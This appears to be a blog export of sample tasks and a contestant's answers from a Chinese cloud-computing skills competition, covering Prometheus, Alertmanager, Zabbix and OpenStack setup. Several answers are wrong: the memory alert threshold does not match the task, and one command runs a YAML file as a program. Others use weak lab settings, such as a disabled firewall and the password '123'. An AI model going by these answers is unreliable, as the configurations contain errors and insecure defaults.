<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#因为启动Prometheus需要使用scrpit模块，所以需要在写一个脚本文件，通过脚本文件启动监控系统</span></span><br><span class="line">nohup.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> /usr/local/prometheus-2.37.0.linux-amd64/</span><br><span class="line"><span class="built_in">nohup</span> ./prometheus &amp;</span><br></pre></td></tr></table></figure>

<h2 id="任务-2-企业级应用的运维（12-分）"><a href="#任务-2-企业级应用的运维（12-分）" class="headerlink" title="任务 2 企业级应用的运维（12 分）"></a>任务 2 企业级应用的运维（12 分）</h2><h3 id="1-使用-prometheus-监控-mysqld-服务"><a href="#1-使用-prometheus-监控-mysqld-服务" class="headerlink" title="1.使用 prometheus 监控 mysqld 服务"></a>1.使用 prometheus 监控 mysqld 服务</h3><p>将提供的mysqld_exporter-0.14.0.linux-amd64.tar.gz 发送到agent虚拟机&#x2F;usr&#x2F;local&#x2F;目录下解压并安装mariadb服务。进入mariadb数据库中创建mysqld_monitor用户并授权，然后创建mariadb配置文件，内容为数据库用户名密码。启动mysqld_exporter组件确保9104端口启动。回到prometheus节点修改prometheus.yml文件并添加mysql被监控信息。重启prometheus，随后web界面刷新并查看mysqld被控信息。</p>
<p>请将ps -ef | grep prometheus命令的返回结果提交至答题框。【3分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@monitor prometheus-2.37.0.1inuax-amd64]# ps -ef l grep prometheus</span><br><span class="line">root 23115 23073 006:50 pts/5 00:00:00 ./prometheus</span><br><span class="line">root 23125 23073 006:51 pts/5 00:00:00 grep --color=auto prometheus</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<p><strong>vi mysqld_exporter.yml</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">slave</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">slave</span> </span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">mysqld_exporter</span></span><br><span class="line">      <span class="attr">copy:</span> <span class="string">src=/root/mysqld_exporter-0.14.0.linux-amd64.tar.gz</span> <span class="string">dest=/usr/local/</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tar</span> <span class="string">it</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo tar -zxvf /usr/local/mysqld_exporter-0.14.0.linux-amd64.tar.gz -C /usr/local&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">anzhuang</span> <span class="string">mariadb</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo yum install -y mariadb*&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">mysqld</span></span><br><span class="line">      <span class="attr">service:</span> <span class="string">name=mariadb</span> <span class="string">state=started</span> <span class="string">enabled=yes</span></span><br></pre></td></tr></table></figure>

<p><strong>在agent节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#授权</span></span><br><span class="line">mysql</span><br><span class="line">&gt;grant <span class="keyword">select</span>,replication client,process ON *.* to <span class="string">&#x27;mysql_monitor&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified by <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&gt;flush privileges;</span><br><span class="line">&gt; quit</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个mariadb文件，并写上连接的用户和密码</span></span><br><span class="line">vi /usr/local/mysqld_exporter-0.14.0.linux-amd64/.my.cnf</span><br><span class="line">[client]</span><br><span class="line">user=mysql_monitor</span><br><span class="line">password=123</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动mysqld_exporter</span></span><br><span class="line"><span class="built_in">nohup</span> /usr/local/mysqld_exporter-0.14.0.linux-amd64/mysqld_exporter --config.my-cnf=/usr/local/mysqld_exporter-0.14.0.linux-amd64/.my.cnf &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#确认是否开启</span></span><br><span class="line">netstat -nltp | grep 9104</span><br></pre></td></tr></table></figure>

<p><strong>回到master节点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /usr/local/prometheus-2.37.0.linux-amd64/prometheus.yml</span><br><span class="line"> - job_name: &#x27;mysql&#x27;</span><br><span class="line">   static_configs:</span><br><span class="line">     - targets: [&#x27;192.168.200.101:9104&#x27;,&#x27;192.168.200.102:9104&#x27;]</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">#重启服务</span><br><span class="line">pkill prometheus</span><br><span class="line">nohup /usr/local/prometheus-2.37.0.linux-amd64/prometheus &amp;</span><br></pre></td></tr></table></figure>

<h3 id="⒉-安装alertmanager报警组件"><a href="#⒉-安装alertmanager报警组件" class="headerlink" title="⒉.安装alertmanager报警组件"></a>⒉.安装alertmanager报警组件</h3><p>将提供的alertmanager-0.21.0.linux-amd64.tar.gz上传到prometheus节点&#x2F;usr&#x2F;local&#x2F;目录下并解压，创建软连接alertmanager-0.23.0.linux-amd64&#x2F;alertmanager。创建service启动文件名为alertmanager.service，然后启动alertmanager查看9093端口。在prometheus.yml配置文件中添加alertmanager信息并重新启动prometheus服务，在agent上停止node_exporter服务。到web界面中查看警报管理器状态是否正常和agent状态是否异常。</p>
<p>请将alertmanager.service添加的内容提交到答题框。【3分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=alertmanager</span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/usr/local/alertmanager-0.21.0.linux-amd64/alertmanager --config.file=/usr/local/alertmanager-0.21.0.linux-amd64/alertmanager.yml</span><br><span class="line">ExecReload=/bin/kill -HUP $MAINPID</span><br><span class="line">KillMode=process</span><br><span class="line">Restart=on-failure</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>过程</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tar -zxvf alertmanager-0.21.0.linux-amd64.tar.gz -C /usr/local/</span><br><span class="line"><span class="built_in">ln</span> -s alertmanager-0.23.0.linux-amd64/ alertmanager</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建service启动文件</span></span><br><span class="line">vi /usr/lib/systemd/system/alertmanager.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=alertmanager</span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/usr/local/alertmanager-0.21.0.linux-amd64/alertmanager --config.file=/usr/local/alertmanager-0.21.0.linux-amd64/alertmanager.yml</span><br><span class="line">ExecReload=/bin/kill -HUP <span class="variable">$MAINPID</span></span><br><span class="line">KillMode=process</span><br><span class="line">Restart=on-failure</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl start alertmanager</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改Prometheus配置文件</span></span><br><span class="line">  - job_name: <span class="string">&#x27;altermanager&#x27;</span></span><br><span class="line">    static_configs:</span><br><span class="line">      - targets: [<span class="string">&#x27;localhost:9093&#x27;</span>]</span><br><span class="line">      </span><br><span class="line">pkill prometheus</span><br><span class="line"><span class="built_in">nohup</span> /usr/local/prometheus/prometheus.yml &amp;</span><br></pre></td></tr></table></figure>

<p><strong>agent</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pkill node_exporter</span><br><span class="line"><span class="built_in">nohup</span> /usr/local/node_exporter-1.3.1.linux-amd64/node_exporter &amp;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220922101236256.png" alt="image-20220922101236256"></p>
<h3 id="3-alertmanager告警邮件文件编写"><a href="#3-alertmanager告警邮件文件编写" class="headerlink" title="3.alertmanager告警邮件文件编写"></a>3.alertmanager告警邮件文件编写</h3><p>Prometheus虚拟机&#x2F;usr&#x2F;local&#x2F;akertmanager&#x2F;中存在着一个alertmanager.yml文件，请根据提供的地址和模板编写告警所发送到的email邮箱地址信息。</p>
<p>将alertmanager.yml文件修改的内容提交至答题框。【3分】</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">smtp_auth_username:</span> <span class="string">&quot;1234567890@qq.com&quot;</span> <span class="comment"># 登录用户名</span></span><br><span class="line">  <span class="attr">smtp_auth_password:</span> <span class="string">&quot;auth_pass&quot;</span> <span class="comment"># 此处的auth password是邮箱的第三方登录授权密码，而非用户密码，尽量用QQ来测试。</span></span><br><span class="line">  <span class="attr">smtp_require_tls:</span> <span class="literal">false</span> <span class="comment"># 有些邮箱需要开启此配置，这里使用的是163邮箱，仅做测试，不需要开启此功能。</span></span><br><span class="line"><span class="attr">route:</span></span><br><span class="line">  <span class="attr">receiver:</span> <span class="string">ops</span></span><br><span class="line">  <span class="attr">group_wait:</span> <span class="string">30s</span> <span class="comment"># 在组内等待所配置的时间，如果同组内，30秒内出现相同报警，在一个组内出现。</span></span><br><span class="line">  <span class="attr">group_interval:</span> <span class="string">5m</span> <span class="comment"># 如果组内内容不变化，合并为一条警报信息，5m后发送。</span></span><br><span class="line">  <span class="attr">repeat_interval:</span> <span class="string">24h</span> <span class="comment"># 发送报警间隔，如果指定时间内没有修复，则重新发送报警。</span></span><br><span class="line">  <span class="attr">group_by:</span> [<span class="string">alertname</span>]  <span class="comment"># 报警分组</span></span><br><span class="line">  <span class="attr">routes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">match:</span></span><br><span class="line">          <span class="attr">team:</span> <span class="string">operations</span></span><br><span class="line">        <span class="attr">group_by:</span> [<span class="string">env</span>,<span class="string">dc</span>]</span><br><span class="line">        <span class="attr">receiver:</span> <span class="string">&#x27;ops&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">receiver:</span> <span class="string">ops</span> <span class="comment"># 路由和标签，根据match来指定发送目标，如果 rule的lable 包含 alertname， 使用 ops 来发送</span></span><br><span class="line">        <span class="attr">group_wait:</span> <span class="string">10s</span></span><br><span class="line">        <span class="attr">match:</span></span><br><span class="line">          <span class="attr">team:</span> <span class="string">operations</span></span><br><span class="line"><span class="comment"># 接收器指定发送人以及发送渠道</span></span><br><span class="line"><span class="attr">receivers:</span></span><br><span class="line"><span class="comment"># ops分组的定义</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">ops</span></span><br><span class="line">  <span class="attr">email_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">to:</span> <span class="string">&#x27;9935226@qq.com,xxxxx@qq.com&#x27;</span> <span class="comment"># 如果想发送多个人就以 &#x27;,&#x27;做分割，写多个邮件人即可。</span></span><br><span class="line">    <span class="attr">send_resolved:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">headers:</span></span><br><span class="line">      <span class="attr">from:</span> <span class="string">&quot;警报中心&quot;</span></span><br><span class="line">      <span class="attr">subject:</span> <span class="string">&quot;[operations] 报警邮件&quot;</span></span><br><span class="line">      <span class="attr">to:</span> <span class="string">&quot;小煜狼皇&quot;</span></span><br></pre></td></tr></table></figure>

<p>4.alertmanager告警规则编写</p>
<p>在prometheus虚拟机的prometheus路径下存在一个&#x2F;rules目录，目录下有一个node_rules.yml文件。请根据提供信息仿照模板编写:</p>
<p>1.内存大于50%报警规则;</p>
<p>2.cpu资源利用率大于75%报警规则;</p>
<p>3.主机磁盘每秒读取数据&gt;5OMB%报警规则;部门名称自定义。</p>
<p>请将上述三项规则的内容提交至答题框。【3分】</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">groups:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">node_health</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">alert:</span> <span class="string">HighMemoryUsage</span></span><br><span class="line">    <span class="attr">expr:</span> <span class="number">1</span><span class="string">-(node_memory_MemAvailable_bytes</span> <span class="string">/</span> <span class="string">node_memory_MemTotal_bytes)</span> <span class="string">&gt;</span> <span class="number">0.75</span></span><br><span class="line">    <span class="attr">for:</span> <span class="string">1m</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="attr">severity:</span> <span class="string">warning</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">summary:</span> <span class="string">High</span> <span class="string">memory</span> <span class="string">usage</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">alert:</span> <span class="string">HighCPUUseage</span></span><br><span class="line">    <span class="attr">expr:</span> <span class="number">1</span><span class="string">-sum(increase(node_cpu_seconds_total&#123;mode=&quot;idle&quot;&#125;[1m]))</span> <span class="string">by</span> <span class="string">(instance)</span> <span class="string">/</span> <span class="string">sum(increase(node_cpu_seconds_total[1m]))</span> <span class="string">by</span> <span class="string">(instance)</span> <span class="string">&gt;</span> <span class="number">0.75</span></span><br><span class="line">    <span class="attr">for:</span> <span class="string">1m</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="attr">severity:</span> <span class="string">warning</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">summary:</span> <span class="string">High</span> <span class="string">CPU</span> <span class="string">usage</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">alert:</span> <span class="string">HighReadTime</span></span><br><span class="line">    <span class="attr">expr:</span> <span class="string">sum(irate(node_disk_read_bytes_total[1m]))</span> <span class="string">by</span> <span class="string">(instance)</span> <span class="string">&gt;</span> <span class="number">50</span> <span class="comment">#这个不确定对不对</span></span><br><span class="line">    <span class="attr">for:</span> <span class="string">1m</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="attr">severity:</span> <span class="string">warning</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">summary:</span> <span class="string">High</span> <span class="string">Read</span> <span class="string">Time</span></span><br></pre></td></tr></table></figure>

<p>过程</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在prometheus路径下创建一个/rules目录，并创建yml文件</span><br><span class="line">创建完成后修改prometheus.yml文件</span><br><span class="line">rule_files:</span><br><span class="line">  - <span class="string">&quot;./rules/node_rules.yml&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重启Prometheus</span></span><br><span class="line">pkill prometheus</span><br><span class="line"><span class="built_in">nohup</span> /usr/local/prometheus-2.37.0.linux-amd64/prometheus &amp;</span><br></pre></td></tr></table></figure>

<p>1.表4中的公网IP和私网IP以自己云主机显示为准，每个人的公网IP和私网IP不同。使用第三方软件远程连接云主机，使用公网IP连接。</p>
<p>2.华为云中云主机名字已命好，直接使用对应名字的云主机即可。</p>
<p>公司在原有的系统集群监控方案中一直使用的是单节点server的zabbix的监控方案但是在使用过程中经常出现server节点宕机等相关问题，公司给技术部下达了解决该问题的通知。经过公司技术部的技术研讨决定使用zabbix+keealived的解决方案决定使用数据库分离以及双节点server的方式去解决该问题,请根据技术部的技术指标完成下列操作。</p>
<h2 id="任务三：-企业级运维（zabbix）"><a href="#任务三：-企业级运维（zabbix）" class="headerlink" title="任务三： 企业级运维（zabbix）"></a>任务三： 企业级运维（zabbix）</h2><h3 id="1-完成zabbix-5-0-LTS版本的安装"><a href="#1-完成zabbix-5-0-LTS版本的安装" class="headerlink" title="1.完成zabbix 5.0 LTS版本的安装"></a>1.完成zabbix 5.0 LTS版本的安装</h3><p>本次zabbix集群决定使用4台主机去实现该功能分别为两台server一台DB服务一台agent服务请按照要求将zabbix搭建完成。</p>
<p>将两台server节点的主页截图黏贴至答题框。【3分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-keepalive的高可用配置"><a href="#2-keepalive的高可用配置" class="headerlink" title="2.keepalive的高可用配置"></a>2.keepalive的高可用配置</h3><p>根据要求完成keepalived的安装与配置要求keepalivedip为10结尾，绑定外网网卡、密码为000000、router_id为100、master节点权重100，backup节点权重80，同时修改相应zabbix监控配置项将所有监控项目引入此ip做到高可用配置。</p>
<p>完成操作后将主页登录界面提交至答题框。【4分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>3.编写状态切换脚本</p>
<p>在keepalived中编写状态切换脚本(check_zabbix_server)，监控zabbix-server是否正常工作，并可在主机出现故障后迅速切换到backup节点提供服务。</p>
<p>请将cat &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf内容提交至答题框。【4分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2022年云计算技能大赛样题</title>
    <url>/posts/c134dd26.html</url>
    <content><![CDATA[<h1 id="A模块：OpenStack平台部署与运维（样题）"><a href="#A模块：OpenStack平台部署与运维（样题）" class="headerlink" title="A模块：OpenStack平台部署与运维（样题）"></a>A模块：OpenStack平台部署与运维（样题）</h1><p><strong>业务场景：</strong></p>
<p>某企业拟使用OpenStack搭建一个企业云平台，用于部署各类企业应用对外对内服务。云平台可实现IT资源池化，弹性分配，集中管理，性能优化以及统一安全认证等。系统结构如下图</p>
<p>企业云平台的搭建使用竞赛平台提供的两台云服务器，配置如下表：</p>
<p>说明:</p>
<p>①选手自行检查工位pc机硬件及网络是否正常;1.选手自行检查工位PC机硬件及网络是否正常；</p>
<p>②竞赛使用集群模式进行，给每个参赛队提供华为云账号和密码及考试系统的账号和密码。选手通过用户名与密码分别登录华为云和考试系统;</p>
<p>③考试用到的软件包都在云主机&#x2F;opt下。</p>
<p>④表1中的公网IP和私网IP以自己云主机显示为准，每个人的公网IP和私网IP不同。使用第三方软件远程连接云主机，使用公网IP连接。</p>
<h2 id="任务1私有云平台环境初始化"><a href="#任务1私有云平台环境初始化" class="headerlink" title="任务1私有云平台环境初始化"></a>任务1私有云平台环境初始化</h2><p><strong>①根据表1中的IP地址规划，设置各服务器节点的IP地址，确保网络正常通信，设置云服务器1主机名为Controller，云服务器2主机名为Compute，并修改hosts文件将IP地址映射为主机名，关闭防火墙并设置为开机不启动，设置SELinux为Permissive 模式。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# hostnamectl set-hostname controller</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##ip地址映射主机,注意该ip地址为自身环境地址</span></span></span><br><span class="line">[root@localhost ~]# vi /etc/hosts</span><br><span class="line">[root@localhost ~]# cat /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.157.20 controller</span><br><span class="line">192.168.157.21 compute</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##关闭防火墙</span></span></span><br><span class="line">[root@localhost ~]# systemctl stop firewalld &amp;&amp; systemctl disable firewalld</span><br><span class="line">Removed symlink /etc/systemd/system/multi-user.target.wants/firewalld.service</span><br><span class="line">Removed symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#关闭安全策略</span></span></span><br><span class="line">[root@localhost ~]# setenforce 0</span><br><span class="line">[root@localhost ~]# cat /etc/selinux/config  | grep -v ^$ | grep -v ^#</span><br><span class="line">SELINUX=permissive</span><br><span class="line">SELINUXTYPE=targeted</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#compute节点修改主机名即可,其他配置相同</span></span></span><br></pre></td></tr></table></figure>

<p><strong>②将提供的CentOS-7-x86_64-DVD-1804.iso和qdkills_cloud_iaas.iso光盘镜像上传到Compute节点的&#x2F;root目录下，然后在&#x2F;opt目录下分别创建centos目录和openstack目录，并将镜像文件CentOS-7-x86_64-DVD-1804.iso挂载到centos目录下，将镜像文件qdkills_cloud_iaas.iso挂载到openstack目录下。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# mkdir /opt/centos</span><br><span class="line">[root@localhost ~]# mkdir /opt/openstack</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# mount CentOS-7-x86_64-DVD-1804.iso /opt/centos/</span><br><span class="line">mount: /dev/loop0 is write-protected, mounting read-only</span><br><span class="line">[root@localhost ~]# mount chinaskills_cloud_iaas.iso /opt/openstack/</span><br><span class="line">mount: /dev/loop1 is write-protected, mounting read-only</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>③在Compute节点上利用centos目录中的软件包安装vsftpd服务器并设置开机自启动，提供yum仓库服务，并分别设置controller节点和compute节点的yum源文件ftp.repo，其中节点的地址使用IP形式。</strong></p>
<p>在compute节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# mv /etc/yum.repos.d/CentOS-* /home/</span><br><span class="line">[root@localhost ~]# vi /etc/yum.repos.d/ftp.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[openstack]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/openstack/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@localhost ~]# yum repolist</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#安装并配置vsftp</span></span></span><br><span class="line">[root@localhost ~]# yum install -y vsftpd</span><br><span class="line">[root@localhost ~]# echo &quot;anon_root=/opt&quot; &gt;&gt; /etc/vsftpd/vsftpd.conf</span><br><span class="line">[root@localhost ~]# systemctl enable --now vsftpd</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/vsftpd.service to /usr/lib/systemd/system/vsftpd.service.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在controller节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cat /etc/yum.repos.d/ftp.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://compute/centos</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">[openstack]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://compute/openstack/iaas-repo</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# yum repolist</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>④在Controller节点上部署chrony服务器，允许其他节点同步时间，启动服务并设置为开机启动；并在compute节点上指定controller节点为上游NTP服务器，重启服务并设为开机启动。</strong></p>
<p>controller节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/chrony.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Use public servers from the pool.ntp.org project.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server controller iburst</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Record the rate at <span class="built_in">which</span> the system clock gains/losses <span class="keyword">time</span>.</span></span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow the system clock to be stepped <span class="keyword">in</span> the first three updates</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">if</span> its offset is larger than 1 second.</span></span><br><span class="line">makestep 1.0 3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable kernel synchronization of the real-time clock (RTC).</span></span><br><span class="line">rtcsync</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable hardware timestamping on all interfaces that support it.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">hwtimestamp *</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Increase the minimum number of selectable sources required to adjust</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">the system clock.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">minsources 2</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow NTP client access from <span class="built_in">local</span> network.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">allow 192.168.0.0/16</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Serve <span class="keyword">time</span> even <span class="keyword">if</span> not synchronized to a <span class="keyword">time</span> <span class="built_in">source</span>.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">local</span> stratum 10</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify file containing keys <span class="keyword">for</span> NTP authentication.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">keyfile /etc/chrony.keys</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify directory <span class="keyword">for</span> <span class="built_in">log</span> files.</span></span><br><span class="line">logdir /var/log/chrony</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Select <span class="built_in">which</span> information is logged.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">log</span> measurements statistics tracking</span></span><br><span class="line">allow 192.168.157.0/24</span><br><span class="line">local stratum 10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##使配置生效</span></span></span><br><span class="line">systemctl restart chronyd</span><br><span class="line">systemctl enable chronyd</span><br><span class="line">chronyc sources</span><br></pre></td></tr></table></figure>

<p>compute节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/chrony.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Use public servers from the pool.ntp.org project.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server controller iburst</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Record the rate at <span class="built_in">which</span> the system clock gains/losses <span class="keyword">time</span>.</span></span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow the system clock to be stepped <span class="keyword">in</span> the first three updates</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">if</span> its offset is larger than 1 second.</span></span><br><span class="line">makestep 1.0 3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable kernel synchronization of the real-time clock (RTC).</span></span><br><span class="line">rtcsync</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable hardware timestamping on all interfaces that support it.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">hwtimestamp *</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Increase the minimum number of selectable sources required to adjust</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">the system clock.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">minsources 2</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow NTP client access from <span class="built_in">local</span> network.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">allow 192.168.0.0/16</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta 